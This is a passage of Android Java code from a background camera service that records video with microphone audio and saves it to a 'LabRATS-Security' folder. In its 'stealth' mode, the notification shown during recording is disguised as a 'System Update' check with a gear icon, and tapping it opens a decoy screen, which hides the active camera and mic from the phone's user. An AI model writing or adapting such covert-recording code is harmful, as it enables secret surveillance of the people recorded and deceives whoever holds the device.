        final String finalCameraId = cameraId;
        final int finalWidth = width;
        final int finalHeight = height;

        backgroundHandler.post(() -> {
            try {
                createOverlay();

                // Wait for surface
                if (surfaceLatch != null) {
                    surfaceLatch.await(5, TimeUnit.SECONDS);
                }

                if (!surfaceReady) {
                    Log.e(TAG, "Surface not ready for video recording");
                    return;
                }

                startVideoRecordingInternal(finalCameraId, finalWidth, finalHeight);

            } catch (Exception e) {
                Log.e(TAG, "Error starting video recording", e);
            }
        });
    }

    private void startVideoRecordingInternal(String cameraId, int width, int height) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Camera permission not granted");
                return;
            }
        }

        try {
            // Close any existing camera
            closeCamera();

            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            Size[] sizes = characteristics.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    .getOutputSizes(MediaRecorder.class);

            Size size = chooseBestSize(sizes, width, height);
            int recWidth = size.getWidth();
            int recHeight = size.getHeight();

            // Create video file
            File videoDir = new File(Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_MOVIES), "LabRATS-Security");
            if (!videoDir.exists()) {
                videoDir.mkdirs();
            }

            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                    .format(new Date());
            File videoFile = new File(videoDir, "VID_" + timestamp + ".mp4");
            currentVideoPath = videoFile.getAbsolutePath();

            // Setup MediaRecorder
            setupMediaRecorder(recWidth, recHeight);

            // Open camera
            if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        cameraDevice = camera;
                        createVideoRecordingSession(recWidth, recHeight);
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        camera.close();
                        cameraDevice = null;
                        isRecording = false;
                    }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Video recording camera error: " + error);
                    camera.close();
                    cameraDevice = null;
                    isRecording = false;
                }
                }, backgroundHandler);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error starting video recording", e);
            isRecording = false;
        }
    }

    private void setupMediaRecorder(int width, int height) throws IOException {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setOutputFile(currentVideoPath);
        mediaRecorder.setVideoEncodingBitRate(4000000); // 4 Mbps
        mediaRecorder.setVideoFrameRate(30);
        mediaRecorder.setVideoSize(width, height);
            // Set orientation hint: 90 for back, 270 for front
            int rotation = 90;
            try {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    rotation = 270;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error getting orientation for video", e);
                rotation = 270;
            }
            mediaRecorder.setOrientationHint(rotation);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setAudioEncodingBitRate(128000);
        mediaRecorder.setAudioSamplingRate(44100);
        mediaRecorder.prepare();

        recorderSurface = mediaRecorder.getSurface();
        Log.d(TAG, "MediaRecorder prepared: " + width + "x" + height + " -> " + currentVideoPath);
    }

    private void createVideoRecordingSession(int width, int height) {
        try {
            List<Surface> surfaces = new ArrayList<>();
            surfaces.add(recorderSurface);

            cameraDevice.createCaptureSession(surfaces,
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            startRecordingCapture();
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Video recording session configuration failed");
                            isRecording = false;
                        }
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating video recording session", e);
            isRecording = false;
        }
    }

    private void startRecordingCapture() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            builder.addTarget(recorderSurface);
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);

            captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);

            mediaRecorder.start();
            isRecording = true;
            recordingStartTime = System.currentTimeMillis();
            Log.d(TAG, "Video recording started: " + currentVideoPath);

            // Update notification
            updateNotification("Recording video...");

        } catch (Exception e) {
            Log.e(TAG, "Error starting recording capture", e);
            isRecording = false;
        }
    }

    public void stopVideoRecording() {
        if (!isRecording) {
            return;
        }

        isRecording = false;
        Log.d(TAG, "Stopping video recording");

        try {
            if (captureSession != null) {
                captureSession.stopRepeating();
                captureSession.close();
                captureSession = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping capture session", e);
        }

        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.reset();
                mediaRecorder.release();
                mediaRecorder = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping MediaRecorder", e);
        }

        if (recorderSurface != null) {
            recorderSurface.release();
            recorderSurface = null;
        }

        closeCamera();

        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
        Log.d(TAG, "Video recording stopped. Duration: " + duration + "s, Path: " + currentVideoPath);

        // Update notification
        updateNotification("Camera service is running");
    }

    private void updateNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            boolean stealth = isStealthMode();
            Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE);

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle(stealth ? "System Update" : "Camera Service")
                    .setContentText(stealth ? "Checking for system updates..." : text)
                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, notification);
            }
        }
    }

    private byte[] rotateJpeg(byte[] data, int degrees) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            if (bitmap == null) return data;

            Matrix matrix = new Matrix();
            matrix.postRotate(degrees);
            Bitmap rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
            
            bitmap.recycle();
            rotatedBitmap.recycle();
            
            return baos.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Error rotating JPEG", e);
            return data;
        }
    }

    // ============ STATIC ACCESSORS FOR VIDEO RECORDING ============

    public static boolean isCurrentlyRecording() {
        return isRecording;
    }

    public static String getCurrentVideoPath() {
        return currentVideoPath;
    }

    public static long getRecordingDuration() {
        if (isRecording && recordingStartTime > 0) {
            return (System.currentTimeMillis() - recordingStartTime) / 1000;
        }
        return 0;
    }
}
